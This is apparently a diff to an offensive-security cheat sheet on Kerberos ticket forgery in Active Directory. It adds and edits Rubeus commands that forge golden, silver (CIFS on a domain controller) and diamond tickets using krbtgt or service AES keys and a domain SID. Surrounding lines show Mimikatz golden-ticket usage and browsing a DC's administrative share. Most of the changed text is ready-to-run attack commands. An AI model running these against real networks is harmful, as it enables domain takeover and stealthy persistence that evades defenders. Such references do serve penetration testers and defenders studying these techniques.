@@ -62,7 +62,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corp.loc
 * **Rubeus.exe**
 
 ```
-.\Rubeus.exe ptt /ticket:ticket.kirbi
+.\Rubeus.exe golden /aes256:<aes256> /user:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /nowrap
 ```
 
 * **Ticketer.py (impacket)**
@@ -152,6 +152,13 @@ Invoke-Mimikatz -Command '"kerberos::golden /domain:corp.local /sid:S-1-5-21-268
 
 Finally we can list the content of File System (In that case because we forged a Ticket for CIFS service on the DC).
 
+* **Rubeus**
+
+```
+.\Rubeus.exe silver /service:cifs/dc-01.corp.local /aes256:<aes256keys> /user:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /nowrap
+```
+
+
 ```
 ls \\dc.corp.local\c$
 ```
@@ -165,7 +172,7 @@ This table shows the available services:
 |                    WinRM                   |    HOST HTTP  And Maybe: WINRM    |
 |               Scheduled Tasks              |                HOST               |
 |        Windows File Sharing                |                CIFS               |
-|                PsExec                      |              CIFS HOST            |
+|                PsExec                      |                CIFS               |
 | LDAP operations, DCSync                    | LDAP                              |
 | Windows Remote Server Administration Tools | RPCSS LDAP CIFS                   |
 | Golden Tickets                             | krbtgt                            |
@@ -258,7 +265,7 @@ A **diamond ticket** is made by modifying the fields of a legitimate TGT that wa
 > **OPSEC Alert** `Diamond Ticket` is more silent than `Golden Ticket`.
 
 ```
-.\Rubeus.exe diamond /tgtdeleg /ticketuser:jdoe /ticketuserid:11112 /gorups:512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap
+.\Rubeus.exe diamond /tgtdeleg /ticketuser:jdoe /ticketuserid:1106 /gorups:512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap
 ```
 
 | **Parameter** | **Description**                                                                                            |
